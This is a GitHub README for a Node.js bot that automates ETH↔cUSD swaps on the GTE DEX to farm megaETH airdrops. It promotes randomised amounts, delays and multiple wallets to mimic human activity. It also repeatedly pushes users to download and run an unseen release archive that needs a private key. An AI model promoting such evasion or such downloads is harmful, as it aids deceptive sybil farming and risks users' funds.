# Auto Swap MegaETH — ETH ↔ cUSD Bot for GTE DEX Farming

[![Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases)  
https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases

[![MegaETH](https://images.unsplash.com/photo-1555949963-aa79dcee981d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1600&q=60)](https://unsplash.com/s/photos/blockchain)

Automated Node.js bot that swaps ETH ↔ cUSD on the GTE decentralized exchange. The bot randomizes amounts, delays, and transaction counts. Use it to exercise addresses for on-chain airdrops or for trading automation on megaETH networks.

Badges
- ![version](https://img.shields.io/badge/status-alpha-orange) 
- ![language](https://img.shields.io/badge/language-Node.js-green)
- Topics: airdrop · automated · bot · crypto · cusd · dex · gte · megaeth · swap · swap-bot · trading · web3

Features
- Swap ETH to cUSD and cUSD to ETH on the GTE DEX.
- Randomized amounts within configured bounds.
- Randomized inter-transaction delays to mimic human activity.
- Batch and single-transaction modes.
- Gas price control and replay protection.
- CLI and programmatic APIs for custom flows.
- Logging and basic metrics for counts, volumes, and failures.

Images & Visuals
- Ethereum icon: https://upload.wikimedia.org/wikipedia/commons/6/6f/Ethereum-icon-purple.svg
- Unsplash blockchain banner (above): https://images.unsplash.com/photo-1555949963-aa79dcee981d

Quick link (releases)
- Download the latest release and run the package from the release assets: https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases

Because that link points to a release path, download the release asset you prefer (zip or tar). Extract and execute the included start script or run node index.js in the extracted folder. The release package contains the runnable bot and sample config files.

How it works — short
- The bot picks a random amount between min and max.
- It chooses a delay pause between transactions.
- It signs and sends swap transactions to the GTE router contract.
- It verifies the transaction outcome and logs the result.
- It repeats until the configured count completes.

Requirements
- Node.js 18+ (LTS recommended)
- npm or yarn
- A funded account on a megaETH-compatible network
- RPC endpoint for the target network
- Private key with swap funds (use a throwaway account for testing)

Install from source
1. Clone or download a release:
   - Clone: git clone https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE
   - Or download the release file from: https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases
2. Install dependencies:
   - npm ci
3. Run:
   - node index.js
   - Or use npm run start

Install from release
- Download the release asset from https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases  
- Extract the archive.
- Open a terminal inside the extracted folder.
- Run npm ci, then node index.js or the provided start script.

Configuration

env example (.env)
- Create a .env file in the project root with these keys:

RPC_URL="https://megaeth-node.example"
PRIVATE_KEY="0xYOUR_PRIVATE_KEY"
GTE_ROUTER="0xGTERouterContract"
ETH_TOKEN_ADDRESS="0xETH"              # optional, for wrapped ETH
CUSD_TOKEN_ADDRESS="0xCUSD"
MIN_SWAP_AMOUNT="0.01"                 # in ETH or token decimals
MAX_SWAP_AMOUNT="0.05"
MIN_DELAY_MS="15000"                   # 15 seconds
MAX_DELAY_MS="90000"                   # 90 seconds
TX_PER_RUN_MIN="1"
TX_PER_RUN_MAX="3"
NETWORK_CHAIN_ID="12345"
GAS_PRICE_GWEI="40"
MAX_RETRIES="3"
LOG_LEVEL="info"

config.json example
{
  "swapDirection": "random",            // "eth_to_cusd", "cusd_to_eth", "random"
  "dryRun": false,
  "slippageTolerance": 0.01,            // 1% slippage
  "randomSeed": null,
  "batchMode": true,
  "metrics": {
    "enable": true,
    "pushIntervalSeconds": 60
  }
}

Key config fields
- swapDirection: Set to force a direction or use "random".
- MIN/MAX_SWAP_AMOUNT: Define min and max amounts in native token units.
- MIN/MAX_DELAY_MS: Define lower and upper bounds for per-transaction sleep.
- TX_PER_RUN_MIN / MAX: Controls how many swaps the bot does per run cycle.
- GAS_PRICE_GWEI: Control gas price for transactions.
- dryRun: Set true to simulate transactions without sending.

Command examples
- Run with env file:
  NODE_ENV=production node index.js
- Override values on the fly:
  RPC_URL="https://node" PRIVATE_KEY="0x..." node index.js
- Use npm scripts:
  npm run start
- Use dry run:
  DRY_RUN=true node index.js

Programmatic usage (API)
- The repository exports a small API to use the bot from other scripts.
- Example:

const { startBot } = require('./lib/bot')
const cfg = require('./config.json')
startBot(cfg)

The API accepts callbacks for events:
- onSwapSent(txHash, meta)
- onSwapResult(success, receipt, meta)
- onError(error, meta)

Randomization details
- Amount randomization uses uniform sampling between min and max.
- Delay randomization uses uniform sampling between minDelay and maxDelay.
- TX count per run samples an integer between TX_PER_RUN_MIN and TX_PER_RUN_MAX.
- You can seed the RNG for reproducible runs.

Logging and metrics
- The bot writes structured JSON logs by default.
- Fields include timestamp, level, event, txHash, amount, direction, gasUsed, gasPrice.
- Metrics collect counters for swaps, success, failure, totalVolume.
- Metrics push supports Prometheus pushgateway or file-based export.

Security practices
- Keep private keys off shared drives.
- Use a designated wallet with limited funds for testing.
- Rotate keys when needed.
- Use an RPC endpoint you control or trust.
- Enable replay protection by setting chain id and proper nonces.

Gas and network tips
- Set GAS_PRICE_GWEI according to network conditions.
- When the network is congested, raise gas price to keep transactions timely.
- If you hit nonce gaps, inspect pending txs and resubmit with higher gas.

Troubleshooting
- If transactions fail with revert:
  - Check slippageTolerance.
  - Check token allowances for cUSD when swapping cUSD → ETH.
- If the bot stalls:
  - Inspect logs for network timeouts.
  - Check RPC_URL and chain ID.
- If you see nonce errors:
  - Ensure only one instance uses the same key.
  - Use a nonce manager or the provided sequential mode.

Testing
- Use a test megaETH network or local fork to test flows.
- Set dryRun to true to validate flow without sending transactions.
- Validate swap amounts against token decimals before running.

Advanced usage
- Use multiple wallets in a single run to parallelize traffic.
- Script dynamic budgets that scale swap amounts by day or time window.
- Integrate with a scheduler to run windows at random times.
- Add custom heuristics to avoid repeating exact amounts.

Contributing
- Fork the repo.
- Create a feature branch.
- Run tests and linters.
- Open a pull request with a clear description of changes.
- Provide minimal reproducer if you fix a bug.

Code style
- The project uses ESLint and Prettier standards.
- Keep functions small and pure.
- Write unit tests for deterministic logic like randomization bounds.

Release files
- The releases page contains packaged builds and example configs:
  https://github.com/SathamHussain0786/auto-swap-megaETH-dex-GTE/releases
- Download the release asset you need and run the included start script or node index.js.
- Releases typically include:
  - bot.zip / bot.tar.gz
  - sample .env and config files
  - changelog.md

FAQ
- Q: Can I use this on mainnet?
  A: The bot has no network-level lock. Use production keys and funds at your own risk. Test in controlled environments first.
- Q: Can I run multiple instances?
  A: Yes. Use separate private keys or implement nonce management to avoid conflicts.
- Q: Does the bot handle approvals?
  A: The release includes helper scripts to set ERC20 allowances. Check scripts/approve.js.

License
- MIT license in LICENSE file.

Contact
- Open issues on GitHub for bugs and feature requests.
- Use pull requests for code changes.